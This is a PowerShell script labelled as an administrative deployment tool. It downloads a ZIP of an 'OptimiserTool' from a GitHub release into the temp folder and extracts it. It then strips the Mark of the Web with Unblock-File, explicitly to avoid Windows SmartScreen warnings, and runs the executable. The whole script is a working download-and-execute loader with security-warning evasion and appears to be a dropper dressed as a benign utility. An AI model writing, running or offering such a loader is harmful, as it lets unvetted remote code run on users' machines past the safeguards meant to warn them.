# ==============================================================================
# Administrative Deployment Script
# Description: Automates download, extraction, unblocking, and execution.
# ==============================================================================

# --- 1. CONFIGURATION ---
# IMPORTANT: Replace this placeholder link with your actual hosted ZIP file URL
$DownloadUrl   = "https://github.com/flerkinman/optimise/releases/download/potoato/OptimiserTool.zip"

$ZipPath       = "$env:TEMP\optimise_archive.zip"
$ExtractFolder = "$env:TEMP\OptimiserTool"
$Executable    = "$ExtractFolder\optimise.exe"

# --- 2. DOWNLOAD ---
Write-Host "[*] Downloading package from source..." -ForegroundColor Cyan
try {
    Invoke-RestMethod -Uri $DownloadUrl -OutFile $ZipPath
    Write-Host "[+] Download complete." -ForegroundColor Green
} catch {
    Write-Error "[-] Failed to download the archive: $_"
    exit
}

# --- 3. EXTRACTION ---
Write-Host "[*] Extracting archive components..." -ForegroundColor Yellow
try {
    # Ensure target directory exists and extract cleanly
    if (-not (Test-Path $ExtractFolder)) { 
        New-Item -ItemType Directory -Path $ExtractFolder | Out-Null 
    }
    Expand-Archive -Path $ZipPath -DestinationPath $ExtractFolder -Force
    Write-Host "[+] Extraction complete." -ForegroundColor Green
} catch {
    Write-Error "[-] Failed to extract archive: $_"
    exit
}

# --- 4. UNBLOCKING & EXECUTION ---
Write-Host "[*] Verifying file trust flags..." -ForegroundColor Cyan
if (Test-Path $Executable) {
    # Strips the 'Mark of the Web' zone identifier to prevent Windows SmartScreen popups
    Unblock-File -Path $Executable
    
    Write-Host "[+] Launching application..." -ForegroundColor Green
    Start-Process -FilePath $Executable -Wait
} else {
    Write-Error "[-] Error: Expected executable not found at $Executable"
}

# --- 5. CLEANUP ---
if (Test-Path $ZipPath) {
    Remove-Item -Path $ZipPath -Force | Out-Null
}
